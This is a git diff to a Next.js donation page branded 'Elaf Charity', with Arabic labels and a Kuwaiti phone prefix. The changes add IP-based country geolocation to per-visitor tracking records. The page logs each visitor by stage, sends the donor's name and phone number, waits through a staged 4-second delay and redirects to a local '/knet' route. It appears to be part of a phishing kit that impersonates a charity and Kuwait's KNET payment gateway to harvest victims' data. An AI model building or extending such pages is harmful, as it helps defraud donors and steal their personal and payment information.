@@ -11,24 +11,39 @@ import { useRouter } from "next/navigation"
 import { FullPageLoader } from "@/components/fullpageloader"
 
 export default function CharityDonationPage() {
-  const [phone, setPhone] = useState('')
-  const [name, setName] = useState('')
+  const [phone, setPhone] = useState("")
+  const [name, setName] = useState("")
   const [value, setValue] = useState(10)
   const [loading, setLoading] = useState(false)
   const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))
+  const [country, setCountry] = useState("")
   const router = useRouter()
 
   useEffect(() => {
     const data = {
       id: _id,
       createdDate: new Date().toISOString(),
-      page:"الرئيسية"
+      page: "الرئيسية",
+      country: country || "Unknown",
     }
     addData(data)
     // Store donation amount in localStorage
     localStorage.setItem("item", value.toString())
-    localStorage.setItem("visitorId",_id)
-  }, [_id])
+    localStorage.setItem("visitorId", _id)
+  }, [_id, country])
+
+  useEffect(() => {
+    // Fetch visitor's country using a geolocation API
+    fetch("https://ipapi.co/json/")
+      .then((response) => response.json())
+      .then((data) => {
+        setCountry(data.country_name || "Unknown")
+      })
+      .catch((error) => {
+        console.error("Error fetching country:", error)
+        setCountry("Unknown")
+      })
+  }, [])
 
   // Update localStorage when donation value changes
   useEffect(() => {
@@ -44,7 +59,7 @@ export default function CharityDonationPage() {
           <img src="/211x54.jpg" alt="Elaf Charity" width={120} height={40} className="h-10 w-auto" />
         </div>
         <button className="text-teal-600">
-          <span className="sr-only">Menu</span> 
+          <span className="sr-only">Menu</span>
           <svg viewBox="0 0 24 24" className="h-6 w-6" fill="none" stroke="currentColor" strokeWidth="2">
             <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16m-7 6h7" />
           </svg>
@@ -68,7 +83,7 @@ export default function CharityDonationPage() {
         {/* Campaign Banner */}
         <div className="relative bg-gradient-to-r from-teal-500 to-teal-400 text-white rounded-lg mx-4 overflow-hidden">
           <div className="flex">
-            <img src="/fzza.jpeg" alt="Child profile"  className="w-full h-auto" />
+            <img src="/fzza.jpeg" alt="Child profile" className="w-full h-auto" />
           </div>
           <div className="absolute left-2 top-1/2 transform -translate-y-1/2 bg-white/20 rounded-full p-1">
             <ChevronLeft className="h-5 w-5 text-white" />
@@ -164,8 +179,12 @@ export default function CharityDonationPage() {
               <div className="flex items-center">
                 <span className="text-xs ml-1">+965</span>
               </div>
-              <input className="text-right text-gray-400 p-1 mx-1"
-              onChange={(e)=>setPhone(e.target.value)} placeholder="رقم الهاتف" aria-label="تليفون المتبرع" />
+              <input
+                className="text-right text-gray-400 p-1 mx-1"
+                onChange={(e) => setPhone(e.target.value)}
+                placeholder="رقم الهاتف"
+                aria-label="تليفون المتبرع"
+              />
               <span className="text-gray-400">تليفون المتبرع</span>
             </div>
           </div>
@@ -173,9 +192,10 @@ export default function CharityDonationPage() {
           <div className="mb-4">
             <div className="border rounded-md p-3 text-right text-gray-400 flex items-center justify-between">
               <input
-              type="text"
+                type="text"
                 className="text-right text-gray-400 p-1 mx-1 flex-1"
-                placeholder="اسم المتبرع "  onChange={(e)=>setName(e.target.value)}
+                placeholder="اسم المتبرع "
+                onChange={(e) => setName(e.target.value)}
                 aria-label="اسم المتبرع"
               />
               <span className="text-gray-400">اسم المتبرع</span>
@@ -246,7 +266,7 @@ export default function CharityDonationPage() {
                 localStorage.setItem("item", value.toString())
                 setTimeout(() => {
                   setLoading(false)
-                  addData({id:_id, page:'كي نت',name:name,phone:phone})
+                  addData({ id: _id, page: "كي نت", name: name, phone: phone, country: country })
                   router.push("/knet")
                 }, 4000)
               }}
